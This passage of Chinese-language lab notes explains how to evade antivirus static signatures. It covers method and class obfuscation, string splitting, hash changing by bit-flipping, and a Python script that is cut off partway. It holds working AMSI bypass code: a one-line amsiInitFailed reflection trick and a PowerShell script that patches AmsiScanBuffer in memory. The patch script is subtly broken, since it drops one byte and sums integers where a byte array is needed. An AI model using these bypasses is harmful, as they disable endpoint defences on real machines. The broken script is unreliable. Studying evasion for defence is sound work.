<p>这里的 bypass.ps1 是上个房间让我们混淆用的</p>
<figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">Ref</span><span style="color: #ABB2BF">].Assembly.GetType(</span><span style="color: #98C379">&#39;System.Management.Automation.AmsiUtils&#39;</span><span style="color: #ABB2BF">).GetField(</span><span style="color: #98C379">&#39;amsiInitFailed&#39;</span><span style="color: #ABB2BF">,</span><span style="color: #98C379">&#39;NonPublic,Static&#39;</span><span style="color: #ABB2BF">).SetValue(</span><span style="color: #D19A66">$null</span><span style="color: #ABB2BF">,</span><span style="color: #D19A66">$true</span><span style="color: #ABB2BF">)</span></span></code></pre></div></div></figure>
<h2 id="Static-Code-Based-Signatures-基于静态代码的签名">Static Code-Based Signatures 基于静态代码的签名</h2>
<p>现在我们鉴别出了有问题的签名，就要着手处理他了。在前面提到的论文中提到了很多在“混淆方法”和“混淆类别”层中有效的解决方案。</p>
<p><strong>Obfuscating methods 混淆方法</strong></p>
<table>
<thead>
<tr>
<th><strong>混淆方法</strong></th>
<th><strong>目的</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>方法代理</td>
<td>创建一个代理方法或替换对象</td>
</tr>
<tr>
<td>方法分散/聚合</td>
<td>将多种方法合并为一种，或将一种方法拆散成多个部分将多种方法合并为一种，或将一种方法拆散成多个部分</td>
</tr>
<tr>
<td>方法克隆</td>
<td>创建一个方法的副本并随机调用每个副本</td>
</tr>
</tbody>
</table>
<p>这三个都是代码混淆中常用的技术，目的是改变代码的结构，让逆向分析变得更困难。下面我来详细解释一下它们的实现方式和原理。</p>
<p><strong>1. 方法代理（Method Proxying）</strong></p>
<p><strong>目的</strong>：创建一个“代理”方法来代替原始方法，以此隐藏原始方法的直接调用关系。</p>
<p><strong>实现方式</strong>： 攻击者不会直接调用 <code>original_function()</code>，而是创建一个中间层——<code>proxy_function()</code>。<code>proxy_function()</code> 的唯一作用就是调用 <code>original_function()</code>。</p>
<p><strong>混淆原理</strong>： 对于静态分析工具来说，它只能看到对 <code>proxy_function()</code> 的调用，而无法直接看到对原始方法的调用。这使得分析师必须多走一步，先分析代理函数，才能找到真正的目标函数。在实际应用中，攻击者会创建大量毫无意义的代理函数，形成一个复杂的调用链，让分析师陷入“代理”的迷宫。</p>
<figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">// 原始调用</span></span>
<span class="line"><span style="color: #abb2bf">call original_function()</span></span>
<span class="line"><span style="color: #abb2bf"></span></span>
<span class="line"><span style="color: #abb2bf">// 代理后的调用</span></span>
<span class="line"><span style="color: #abb2bf">call proxy_function_a()</span></span>
<span class="line"><span style="color: #abb2bf">...</span></span>
<span class="line"><span style="color: #abb2bf">proxy_function_a() {</span></span>
<span class="line"><span style="color: #abb2bf">    call proxy_function_b()</span></span>
<span class="line"><span style="color: #abb2bf">}</span></span>
<span class="line"><span style="color: #abb2bf">...</span></span>
<span class="line"><span style="color: #abb2bf">proxy_function_b() {</span></span>
<span class="line"><span style="color: #abb2bf">    call original_function()</span></span>
<span class="line"><span style="color: #abb2bf">}</span></span></code></pre></div></div></figure>
<hr>
<p><strong>2. 方法分散/聚合（Method Scattering/Aggregation）</strong></p>
<p>这个混淆方式有两种相反的操作，但目的都是为了打乱代码的组织结构。</p>
<ul>
<li><strong>方法分散（Scattering）</strong>：
<ul>
<li><strong>目的</strong>：将一个完整的函数拆分成多个小的、不连续的代码块，并将它们分散在程序的各个角落。</li>
<li><strong>实现方式</strong>：攻击者会将一个函数 <code>original_function()</code> 拆分成 <code>original_function_part1</code>、<code>original_function_part2</code> 等。当程序执行时，它会通过复杂的跳转指令或函数调用，将这些分散的部分重新拼接起来执行。</li>
<li><strong>混淆原理</strong>：这破坏了代码的连续性。分析师无法通过简单地从上到下阅读代码来理解其功能。他们必须手动跟踪每一个跳转和调用，才能将所有代码块拼凑完整。</li>
</ul>
</li>
<li><strong>方法聚合（Aggregation）</strong>：
<ul>
<li><strong>目的</strong>：将多个功能不相关的函数或代码块合并到一个巨大的函数中。</li>
<li><strong>实现方式</strong>：攻击者会将多个函数，比如 <code>download_file()</code> 和 <code>encrypt_data()</code>，合并成一个名为 <code>complex_function()</code> 的函数。</li>
<li><strong>混淆原理</strong>：这使得 <code>complex_function()</code> 变得非常庞大且难以理解。分析师必须在一大堆看似无关的代码中，找出并分离出那些真正执行恶意功能的代码，工作量呈指数级上升。</li>
</ul>
</li>
</ul>
<hr>
<p><strong>3. 方法克隆（Method Cloning）</strong></p>
<p><strong>目的</strong>：为同一个方法创建多个功能完全相同的副本，并随机调用这些副本。</p>
<p><strong>实现方式</strong>： 攻击者会为 <code>original_function()</code> 创建多个副本，例如 <code>original_function_clone1()</code>、<code>original_function_clone2()</code> 等。这些副本的内部代码可能完全相同，或者经过了轻微的混淆（比如改变了寄存器使用顺序）。在调用时，程序会随机选择一个副本进行调用。</p>
<p><strong>混淆原理</strong>： 当杀毒软件的静态签名引擎发现一个可疑的函数时，它会为这个函数建立一个签名。但如果存在成百上千个功能相同但字节码不同的克隆函数，杀毒软件就无法为它们一一建立签名。同时，这也使得分析师的工作变得重复且乏味，因为他们必须分析每一个克隆副本，才能确定其真实功能。</p>
<p><strong>Obfuscating Classes 混淆类</strong></p>
<table>
<thead>
<tr>
<th><strong>混淆方法</strong></th>
<th><strong>目的</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>类层次扁平化</td>
<td>使用接口为类创建代理</td>
</tr>
<tr>
<td>类拆分/合并</td>
<td>将局部变量或指令组转移到另一个类</td>
</tr>
<tr>
<td>删除修饰符</td>
<td>移除类修饰符（public、private），并将所有成员设置为 public</td>
</tr>
</tbody>
</table>
<p><strong>1. 类层次扁平化 (Class Hierarchy Flattening)</strong></p>
<ul>
<li><strong>目的</strong>: 移除复杂的继承关系，使所有类都看起来是独立的，隐藏它们之间的逻辑联系。</li>
<li><strong>实现原理</strong>: 攻击者会消除类之间的继承（<code>extends</code>）或接口实现（<code>implements</code>）关系。原始代码中，子类可能继承父类的多个方法和属性，但在混淆后，这些继承来的方法和属性会被直接复制到子类中。这样一来，复杂的类层次结构就会被“拍平”，变成一堆互不相干的独立类。</li>
<li><strong>混淆原理</strong>: 这种技术让分析师无法通过观察继承链来推断类的功能和关系。分析师必须单独检查每一个类，以确定其所有功能，工作量大大增加。</li>
</ul>
<hr>
<p><strong>2. 类拆分/合并 (Class Splitting/Merging)</strong></p>
<ul>
<li><strong>目的</strong>: 打乱类的内部结构，使代码的逻辑分散或集中，从而混淆分析。</li>
<li><strong>实现原理</strong>:
<ul>
<li><strong>拆分 (Splitting)</strong>: 将一个类中的局部变量或方法，移动到另一个不相关的类中。例如，一个恶意类的关键数据或方法可能被拆分到多个不同的、看起来无害的类中。</li>
<li><strong>合并 (Merging)</strong>: 将多个类中的代码聚合到一个单一的、巨大的类中。这会使类变得异常庞大且难以理解。</li>
</ul>
</li>
<li><strong>混淆原理</strong>: 这种混淆技术破坏了面向对象编程的封装性。它使得分析师无法通过类的名字或功能来快速定位关键代码。如果一个类包含了太多无关的功能，或者一个功能被分散到多个类中，分析师就很难追踪完整的执行流程。</li>
</ul>
<hr>
<p><strong>3. 删除修饰符 (Modifier Removal)</strong></p>
<ul>
<li><strong>目的</strong>: 移除类和方法的修饰符（如 <code>public</code>、<code>private</code>），并把所有成员设为 <code>public</code>，以此来混淆代码的访问权限和结构。</li>
<li><strong>实现原理</strong>: 攻击者会修改代码，使所有类和方法的修饰符都被删除或替换为 <code>public</code>。例如，<code>private</code> 变量和 <code>protected</code> 方法都会被修改为 <code>public</code>。</li>
<li><strong>混淆原理</strong>: 这种做法破坏了面向对象编程的访问控制和封装原则。在正常的代码中，<code>private</code> 意味着这个方法或变量只能在类内部使用，这为分析师提供了重要的上下文线索。当所有成员都变为 <code>public</code> 后，分析师就无法通过访问权限来推断代码的内部逻辑，从而增加了分析的难度。</li>
</ul>
<h3 id="核心混淆思想的归纳"><strong>核心混淆思想的归纳</strong></h3>
<p><strong>1. 拆分与合并</strong></p>
<p>所有与“拆分”或“合并”相关的混淆技术，无论是<strong>类拆分/聚合</strong>（<code>class splitting/coalescing</code>）还是<strong>方法分散/聚合</strong>（<code>method scattering/aggregation</code>），它们的核心目的只有一个：<strong>打破代码的正常组织结构，使其难以被分析师追踪。</strong></p>
<ul>
<li><strong>实现原理</strong>：它们通过改变代码的“大小”和“位置”来制造混乱。一个原本逻辑清晰、封装良好的代码块（无论是类还是方法），会被拆得四分五裂或者被合并成一个臃肿的巨兽。</li>
<li><strong>最终目的</strong>：让分析师无法通过观察代码的常规结构（如类的边界、函数的开始与结束）来理解其功能。分析师必须耗费大量时间，手动将这些被分散的代码片段重新拼凑起来。</li>
</ul>
<p><strong>2. 隐藏和混淆可识别信息</strong></p>
<p>另一类混淆技术，包括<strong>删除修饰符</strong>（<code>dropping modifiers</code>）和<strong>方法克隆</strong>（<code>method clone</code>），其核心作用是：<strong>剥离或隐藏任何能为分析师提供线索的“元数据”。</strong></p>
<ul>
<li><strong>实现原理</strong>：这些方法不改变代码的逻辑，而是针对那些帮助人类理解代码的“标签”进行操作。
<ul>
<li><strong>删除修饰符</strong>会移除像 <code>public</code>、<code>private</code> 这样的访问权限，破坏了面向对象编程的封装性，让分析师无法通过这些修饰符来推断代码的内部逻辑。</li>
<li><strong>方法克隆</strong>则通过制造大量功能相同但代码形式不同的副本，来规避基于签名的检测，并让分析师陷入无止境的重复分析。</li>
</ul>
</li>
<li><strong>最终目的</strong>：让恶意代码在静态分析阶段看起来毫无特征，并且不提供任何可供参考的“线索”，迫使分析师从零开始进行行为分析。</li>
</ul>
<h3 id="Splitting-and-Merging-Objects-拆分与合并对象">Splitting and Merging Objects 拆分与合并对象</h3>
<p>这个和之前拼接字符串很相似，在原理上是相等的，不过我们这里要操作的是一个字符串<strong>对象</strong>。尽管他是一个字符串，但是在面向对象语言里面万物皆对象。</p>
<p><strong>原会被检测的字符串</strong></p>
<figure class="shiki csharp"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">string</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">MessageFormat</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">@&quot;{{</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">GUID</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">:</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">{0}</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">,</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">Type</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">:{1},</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">Meta</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">:</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">{2},</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">IV</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">:</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">{3}</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">,</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">EncryptedMessage</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">:</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">{4}</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">,</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">HMAC</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">:</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">{5}</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">}}&quot;</span><span style="color: #ABB2BF">;</span></span></code></pre></div></div></figure>
<p><strong>混淆的方法</strong></p>
<p>通过构造一个字符串类来规避检测，这个只是能过静态，字符串的拼接是在运行时执行的，所以能绕过静态签名检测</p>
<figure class="shiki csharp"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">string</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">GetMessageFormat</span><span style="color: #ABB2BF"> </span><span style="color: #7F848E; font-style: italic">// Format the public method</span></span>
<span class="line"><span style="color: #ABB2BF">{</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">get</span><span style="color: #ABB2BF"> </span><span style="color: #7F848E; font-style: italic">// Return the property value</span></span>
<span class="line"><span style="color: #ABB2BF">    {</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">var</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">sb</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> new </span><span style="color: #E5C07B">StringBuilder</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">@&quot;{{</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">GUID</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">:</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">{0}</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">,&quot;</span><span style="color: #ABB2BF">); </span><span style="color: #7F848E; font-style: italic">// Start the built-in concatenation method</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">sb</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">Append</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">@&quot;</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">Type</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">:{1},&quot;</span><span style="color: #ABB2BF">); </span><span style="color: #7F848E; font-style: italic">// Append substrings onto the string</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">sb</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">Append</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">@&quot;</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">Meta</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">:</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">{2}</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">,&quot;</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">sb</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">Append</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">@&quot;</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">IV</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">:</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">{3}</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">,&quot;</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">sb</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">Append</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">@&quot;</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">EncryptedMessage</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">:</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">{4}</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">,&quot;</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">sb</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">Append</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">@&quot;</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">HMAC</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">:</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">{5}</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">}}&quot;</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">sb</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">ToString</span><span style="color: #ABB2BF">(); </span><span style="color: #7F848E; font-style: italic">// Return the concatenated string to the class</span></span>
<span class="line"><span style="color: #ABB2BF">    }</span></span>
<span class="line"><span style="color: #ABB2BF">}</span></span>
<span class="line"></span>
<span class="line"><span style="color: #C678DD">string</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">MessageFormat</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">GetMessageFormat</span></span></code></pre></div></div></figure>
<h3 id="Removing-and-Obscuring-Identifiable-Information-删除和模糊可识别信息">Removing and Obscuring Identifiable Information 删除和模糊可识别信息</h3>
<p>这个和之前用过的模糊变量名是一样的，下面是我处理好的 PowerShell 脚本，可以看到里面的变量名没变，处理过的是写死的字符串和数组，在运行时拼接。</p>
<figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E06C75">$MethodDefinition</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #98C379">    [DllImport(</span><span style="color: #56B6C2">`&quot;</span><span style="color: #98C379">kernel32</span><span style="color: #56B6C2">`&quot;</span><span style="color: #98C379">)]</span></span>
<span class="line"><span style="color: #98C379">    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);</span></span>
<span class="line"></span>
<span class="line"><span style="color: #98C379">    [DllImport(</span><span style="color: #56B6C2">`&quot;</span><span style="color: #98C379">kernel32</span><span style="color: #56B6C2">`&quot;</span><span style="color: #98C379">)]</span></span>
<span class="line"><span style="color: #98C379">    public static extern IntPtr GetModuleHandle(string lpModuleName);</span></span>
<span class="line"></span>
<span class="line"><span style="color: #98C379">    [DllImport(</span><span style="color: #56B6C2">`&quot;</span><span style="color: #98C379">kernel32</span><span style="color: #56B6C2">`&quot;</span><span style="color: #98C379">)]</span></span>
<span class="line"><span style="color: #98C379">    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);</span></span>
<span class="line"><span style="color: #98C379">&quot;</span><span style="color: #ABB2BF">;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #E06C75">$Kernel32</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">Add-Type</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">MemberDefinition </span><span style="color: #E06C75">$MethodDefinition</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Name </span><span style="color: #98C379">&#39;Kernel32&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">NameSpace </span><span style="color: #98C379">&#39;Win32&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">PassThru;</span></span>
<span class="line"><span style="color: #E06C75">$A</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;Ams&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;iSca&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;nBu&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;ffer&quot;</span></span>
<span class="line"><span style="color: #E06C75">$handle</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> [</span><span style="color: #C678DD">Win32.Kernel32</span><span style="color: #ABB2BF">]::GetModuleHandle(</span><span style="color: #98C379">&#39;amsi.dll&#39;</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">IntPtr</span><span style="color: #ABB2BF">]</span><span style="color: #E06C75">$BufferAddress</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> [</span><span style="color: #C678DD">Win32.Kernel32</span><span style="color: #ABB2BF">]::GetProcAddress(</span><span style="color: #E06C75">$handle</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">$A</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">UInt32</span><span style="color: #ABB2BF">]</span><span style="color: #E06C75">$Size</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0x5</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">UInt32</span><span style="color: #ABB2BF">]</span><span style="color: #E06C75">$ProtectFlag</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0x40</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">UInt32</span><span style="color: #ABB2BF">]</span><span style="color: #E06C75">$OldProtectFlag</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">Win32.Kernel32</span><span style="color: #ABB2BF">]::VirtualProtect(</span><span style="color: #E06C75">$BufferAddress</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">$Size</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">$ProtectFlag</span><span style="color: #ABB2BF">, [</span><span style="color: #C678DD">Ref</span><span style="color: #ABB2BF">]</span><span style="color: #E06C75">$OldProtectFlag</span><span style="color: #ABB2BF">);</span></span>
<span class="line"></span>
<span class="line"><span style="color: #E06C75">$buf0</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> [</span><span style="color: #C678DD">UInt32</span><span style="color: #ABB2BF">]</span><span style="color: #D19A66">0xB8</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #E06C75">$buf1</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> [</span><span style="color: #C678DD">UInt32</span><span style="color: #ABB2BF">]</span><span style="color: #D19A66">0x57</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #E06C75">$buf2</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> [</span><span style="color: #C678DD">UInt32</span><span style="color: #ABB2BF">]</span><span style="color: #D19A66">0x00</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #E06C75">$buf3</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> [</span><span style="color: #C678DD">UInt32</span><span style="color: #ABB2BF">]</span><span style="color: #D19A66">0x07</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #E06C75">$buf4</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> [</span><span style="color: #C678DD">Uint32</span><span style="color: #ABB2BF">]</span><span style="color: #D19A66">0x80</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #E06C75">$buf5</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> [</span><span style="color: #C678DD">Uint32</span><span style="color: #ABB2BF">]</span><span style="color: #D19A66">0xC3</span><span style="color: #ABB2BF">; </span></span>
<span class="line"></span>
<span class="line"><span style="color: #E06C75">$buf</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$buf1</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$buf2</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$buf3</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$buf4</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$buf5</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">system.runtime.interopservices.marshal</span><span style="color: #ABB2BF">]::copy(</span><span style="color: #E06C75">$buf</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">$BufferAddress</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">6</span><span style="color: #ABB2BF">);</span></span></code></pre></div></div></figure>
<h2 id="Static-Property-Based-Signatures-基于静态属性的特征签名">Static Property-Based Signatures 基于静态属性的特征签名</h2>
<p>各种杀软和分析人员可能会考虑到不同的因素，而不是仅仅依赖字符串和静态签名去检验一个文件是否安全。签名实际上可以附加到很多文件属性上，比如哈希、熵、作者、名称或其他可识别的信息，这些可以单独使用或结合使用。</p>
<p>有些属性可能很容易被操纵，但有些很难被处理，尤其是在处理预编译的闭源应用程序时，这里我们会提到控制文件 Hash 和引入一个熵的概念。</p>
<h3 id="File-Hashes-文件-Hash">File Hashes 文件 Hash</h3>
<p>哈希（也叫校验和）是文件的唯一指纹，用于识别文件是否被篡改或验证其用途（比如是否为恶意）。对文件的任何修改，哪怕只是一点点，都会导致哈希值完全改变。</p>
<ul>
<li><strong>对于有源代码的应用</strong>：我们可以修改任意代码，然后重新编译，轻松得到一个新哈希。</li>
<li><strong>对于已编译或已签名的应用</strong>：我们无法修改源代码，这时就需要使用**比特翻转（bit-flipping）**技术。</li>
</ul>
<p>比特翻转是一种常见的攻击手段，它会逐个翻转并测试文件中的每一个比特，直到找到一个既能改变文件哈希，又不会破坏程序功能的“幸运”比特。这样一来，恶意软件就能在保持功能不变的情况下，获得一个全新的哈希值，从而绕过基于哈希的静态检测。</p>
<p>我们可以使用脚本自动化通过翻转每一位比特：</p>
<figure class="shiki python"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">import</span><span style="color: #ABB2BF"> sys</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">orig </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">list</span><span style="color: #ABB2BF">(</span><span style="color: #56B6C2">open</span><span style="color: #ABB2BF">(sys.argv[</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">], </span><span style="color: #98C379">&quot;rb&quot;</span><span style="color: #ABB2BF">).</span><span style="color: #61AFEF">read</span><span style="color: #ABB2BF">())</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">i </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0</span></span>
